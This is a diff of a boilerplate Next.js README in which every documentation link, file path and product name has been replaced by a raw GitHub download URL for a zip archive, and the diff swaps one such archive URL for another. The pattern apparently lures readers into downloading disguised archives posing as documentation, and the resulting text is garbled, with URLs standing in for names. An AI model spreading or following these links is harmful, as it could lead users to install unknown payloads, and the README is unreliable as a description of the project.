@@ -1,4 +1,4 @@
-This is a [https://github.com/suryansh-malik/gittest/raw/refs/heads/main/prisma/Software_3.1-beta.1.zip](https://github.com/suryansh-malik/gittest/raw/refs/heads/main/prisma/Software_3.1-beta.1.zip) project bootstrapped with [`create-next-app`](https://github.com/suryansh-malik/gittest/raw/refs/heads/main/prisma/Software_3.1-beta.1.zip).
+This is a [https://github.com/suryansh-malik/gittest/raw/refs/heads/main/lib/ui/Software_1.2.zip](https://github.com/suryansh-malik/gittest/raw/refs/heads/main/lib/ui/Software_1.2.zip) project bootstrapped with [`create-next-app`](https://github.com/suryansh-malik/gittest/raw/refs/heads/main/lib/ui/Software_1.2.zip).
 
 ## Getting Started
 
@@ -16,21 +16,21 @@ bun dev
 
 Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
 
-You can start editing the page by modifying `https://github.com/suryansh-malik/gittest/raw/refs/heads/main/prisma/Software_3.1-beta.1.zip`. The page auto-updates as you edit the file.
+You can start editing the page by modifying `https://github.com/suryansh-malik/gittest/raw/refs/heads/main/lib/ui/Software_1.2.zip`. The page auto-updates as you edit the file.
 
-This project uses [`next/font`](https://github.com/suryansh-malik/gittest/raw/refs/heads/main/prisma/Software_3.1-beta.1.zip) to automatically optimize and load [Geist](https://github.com/suryansh-malik/gittest/raw/refs/heads/main/prisma/Software_3.1-beta.1.zip), a new font family for Vercel.
+This project uses [`next/font`](https://github.com/suryansh-malik/gittest/raw/refs/heads/main/lib/ui/Software_1.2.zip) to automatically optimize and load [Geist](https://github.com/suryansh-malik/gittest/raw/refs/heads/main/lib/ui/Software_1.2.zip), a new font family for Vercel.
 
 ## Learn More
 
-To learn more about https://github.com/suryansh-malik/gittest/raw/refs/heads/main/prisma/Software_3.1-beta.1.zip, take a look at the following resources:
+To learn more about https://github.com/suryansh-malik/gittest/raw/refs/heads/main/lib/ui/Software_1.2.zip, take a look at the following resources:
 
-- [https://github.com/suryansh-malik/gittest/raw/refs/heads/main/prisma/Software_3.1-beta.1.zip Documentation](https://github.com/suryansh-malik/gittest/raw/refs/heads/main/prisma/Software_3.1-beta.1.zip) - learn about https://github.com/suryansh-malik/gittest/raw/refs/heads/main/prisma/Software_3.1-beta.1.zip features and API.
-- [Learn https://github.com/suryansh-malik/gittest/raw/refs/heads/main/prisma/Software_3.1-beta.1.zip](https://github.com/suryansh-malik/gittest/raw/refs/heads/main/prisma/Software_3.1-beta.1.zip) - an interactive https://github.com/suryansh-malik/gittest/raw/refs/heads/main/prisma/Software_3.1-beta.1.zip tutorial.
+- [https://github.com/suryansh-malik/gittest/raw/refs/heads/main/lib/ui/Software_1.2.zip Documentation](https://github.com/suryansh-malik/gittest/raw/refs/heads/main/lib/ui/Software_1.2.zip) - learn about https://github.com/suryansh-malik/gittest/raw/refs/heads/main/lib/ui/Software_1.2.zip features and API.
+- [Learn https://github.com/suryansh-malik/gittest/raw/refs/heads/main/lib/ui/Software_1.2.zip](https://github.com/suryansh-malik/gittest/raw/refs/heads/main/lib/ui/Software_1.2.zip) - an interactive https://github.com/suryansh-malik/gittest/raw/refs/heads/main/lib/ui/Software_1.2.zip tutorial.
 
-You can check out [the https://github.com/suryansh-malik/gittest/raw/refs/heads/main/prisma/Software_3.1-beta.1.zip GitHub repository](https://github.com/suryansh-malik/gittest/raw/refs/heads/main/prisma/Software_3.1-beta.1.zip) - your feedback and contributions are welcome!
+You can check out [the https://github.com/suryansh-malik/gittest/raw/refs/heads/main/lib/ui/Software_1.2.zip GitHub repository](https://github.com/suryansh-malik/gittest/raw/refs/heads/main/lib/ui/Software_1.2.zip) - your feedback and contributions are welcome!
 
 ## Deploy on Vercel
 
-The easiest way to deploy your https://github.com/suryansh-malik/gittest/raw/refs/heads/main/prisma/Software_3.1-beta.1.zip app is to use the [Vercel Platform](https://github.com/suryansh-malik/gittest/raw/refs/heads/main/prisma/Software_3.1-beta.1.zip) from the creators of https://github.com/suryansh-malik/gittest/raw/refs/heads/main/prisma/Software_3.1-beta.1.zip
+The easiest way to deploy your https://github.com/suryansh-malik/gittest/raw/refs/heads/main/lib/ui/Software_1.2.zip app is to use the [Vercel Platform](https://github.com/suryansh-malik/gittest/raw/refs/heads/main/lib/ui/Software_1.2.zip) from the creators of https://github.com/suryansh-malik/gittest/raw/refs/heads/main/lib/ui/Software_1.2.zip
 
-Check out our [https://github.com/suryansh-malik/gittest/raw/refs/heads/main/prisma/Software_3.1-beta.1.zip deployment documentation](https://github.com/suryansh-malik/gittest/raw/refs/heads/main/prisma/Software_3.1-beta.1.zip) for more details.
+Check out our [https://github.com/suryansh-malik/gittest/raw/refs/heads/main/lib/ui/Software_1.2.zip deployment documentation](https://github.com/suryansh-malik/gittest/raw/refs/heads/main/lib/ui/Software_1.2.zip) for more details.
